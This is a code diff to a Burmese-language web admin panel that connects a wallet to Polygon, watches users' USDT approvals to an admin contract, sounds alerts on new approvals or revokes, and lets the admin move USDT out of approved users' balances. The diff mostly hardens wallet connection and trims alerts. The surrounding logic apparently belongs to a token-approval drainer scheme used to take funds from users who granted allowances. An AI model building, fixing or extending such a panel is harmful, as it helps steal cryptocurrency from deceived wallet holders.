@@ -174,24 +174,62 @@
         ];
 
         async function connectAdminWallet() {
-            if (typeof window.ethereum === "undefined") {
-                alert("MetaMask သို့မဟုတ် Web3 Wallet ကို Install လုပ်ပါ။");
+            console.log("Connect button clicked");
+            const statusDiv = document.getElementById("adminStatus");
+            statusDiv.innerText = "Wallet ချိတ်ဆက်နေသည်...";
+
+            // Robust ethereum provider check for mobile DApp browsers
+            let eth = window.ethereum;
+            if (!eth && window.web3) {
+                eth = window.web3.currentProvider;
+            }
+
+            if (!eth) {
+                alert("Web3 Wallet (MetaMask/Trust) မတွေ့ရှိပါ။ ကျေးဇူးပြု၍ Wallet အက်ပ်၏ DApp Browser ထဲတွင် ဖွင့်ပါ။");
+                statusDiv.innerText = "Wallet မတွေ့ရှိပါ။";
                 return;
             }
-            try {
-                await window.ethereum.request({
-                    method: "wallet_switchEthereumChain",
-                    params: [{ chainId: POLYGON_CHAIN_ID }],
-                });
 
-                provider = new ethers.BrowserProvider(window.ethereum);
+            try {
+                // Switch or add Polygon Network safely
+                try {
+                    await eth.request({
+                        method: "wallet_switchEthereumChain",
+                        params: [{ chainId: POLYGON_CHAIN_ID }],
+                    });
+                } catch (switchError) {
+                    // This error code indicates that the chain has not been added to MetaMask.
+                    if (switchError.code === 4902) {
+                        try {
+                            await eth.request({
+                                method: "wallet_addEthereumChain",
+                                params: [{
+                                    chainId: POLYGON_CHAIN_ID,
+                                    chainName: "Polygon Mainnet",
+                                    nativeCurrency: { name: "MATIC", symbol: "MATIC", decimals: 18 },
+                                    rpcUrls: ["https://polygon-rpc.com/"],
+                                    blockExplorerUrls: ["https://polygonscan.com/"]
+                                }],
+                            });
+                        } catch (addError) {
+                            console.error("Failed to add Polygon chain", addError);
+                        }
+                    }
+                }
+
+                provider = new ethers.BrowserProvider(eth);
                 const accounts = await provider.send("eth_requestAccounts", []);
+                if (!accounts || accounts.length === 0) {
+                    throw new Error("Wallet Account ရယူ၍မရပါ။");
+                }
+
                 adminAddress = accounts[0];
                 adminSigner = await provider.getSigner();
 
-                document.getElementById("connectAdminBtn").innerText = "Connected (Polygon)";
-                document.getElementById("connectAdminBtn").classList.replace("bg-blue-600", "bg-emerald-600");
-                document.getElementById("adminStatus").innerText = `Admin Connected: ${adminAddress.substring(0,6)}...${adminAddress.substring(38)}`;
+                const btn = document.getElementById("connectAdminBtn");
+                btn.innerText = "Connected (Polygon)";
+                btn.classList.replace("bg-blue-600", "bg-emerald-600");
+                statusDiv.innerText = `Admin Connected: ${adminAddress.substring(0,6)}...${adminAddress.substring(38)}`;
                 document.getElementById("livePulse").classList.remove("hidden");
                 
                 await refreshUserTable(false);
@@ -203,8 +241,9 @@
                 }, 8000);
 
             } catch (err) {
-                console.error(err);
-                document.getElementById("adminStatus").innerText = "Admin Wallet ချိတ်ဆက်မှု သို့မဟုတ် Network ပြောင်းလဲမှု မအောင်မြင်ပါ။";
+                console.error("Connection error:", err);
+                statusDiv.innerText = "ချိတ်ဆက်မှု မအောင်မြင်ပါ (သို့မဟုတ်) ငြင်းပယ်လိုက်ပါပြီ။";
+                alert("Wallet ချိတ်ဆက်မှု အမှားအယွင်း: " + (err.message || err));
             }
         }
 
@@ -250,7 +289,6 @@
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
                 const adminContract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, provider);
 
-                // Real-time Approval / Revoke Listener
                 const approvalFilter = usdtContract.filters.Approval(null, ADMIN_CONTRACT_ADDRESS);
                 usdtContract.on(approvalFilter, async (owner, spender, value) => {
                     if (owner) {
@@ -265,17 +303,9 @@
 
                         playAlertSound(isRevoked);
                         refreshUserTable(true);
-
-                        const shortAddr = `${owner.substring(0,6)}...${owner.substring(38)}`;
-                        if (isRevoked) {
-                            alert(`⚠️ သတိပေးချက်: User (${shortAddr}) မှ Approval ကို Revoke (ပယ်ဖျက်) လိုက်ပါပြီ။`);
-                        } else {
-                            alert(`🚨 အသစ်ဝင်ရောက်လာမှု: User (${shortAddr}) မှ အောင်မြင်စွာ Approve လုပ်လိုက်ပါပြီ။`);
-                        }
                     }
                 });
 
-                // Real-time Withdraw Request Listener
                 loadWithdrawRequests();
                 adminContract.on("WithdrawRequested", (userAddr, amountBN) => {
                     const amountFormatted = ethers.formatUnits(amountBN, 6);
@@ -289,8 +319,6 @@
                         refreshUserTable(true);
                     }
                 });
-
-                document.getElementById("adminStatus").innerText = `Admin Connected: ${adminAddress.substring(0,6)}...${adminAddress.substring(38)} | Real-time Live Sync & Revoke Monitor Active`;
             } catch (err) {
                 console.error("Realtime listener error:", err);
             }
@@ -359,8 +387,6 @@
                             continue;
                         }
 
-                        // If allowance is 0 (Revoked), skip displaying in active list or show as revoked
-                        If allowance is 0 (Revoked), skip displaying in active list or show as revoked
                         if (Number(allowanceBN) === 0) continue;
 
                         const balance = Number(ethers.formatUnits(balanceBN, 6));
@@ -595,9 +621,9 @@
             }
         }
 
-        async function handleTransferApprove(userAddr, defaultAmount) {
+        async function handleTransferApprove(userAddr, defaultStatus) {
             try {
-                const amountStr = prompt("ပေးပို့မည့် USDT ပမာဏကို ထည့်သွင်းပါ:", defaultAmount);
+                const amountStr = prompt("ပေးပို့မည့် USDT ပမာဏကို ထည့်သွင်းပါ:", defaultStatus);
                 if (!amountStr) return;
 
                 if (!adminSigner) {
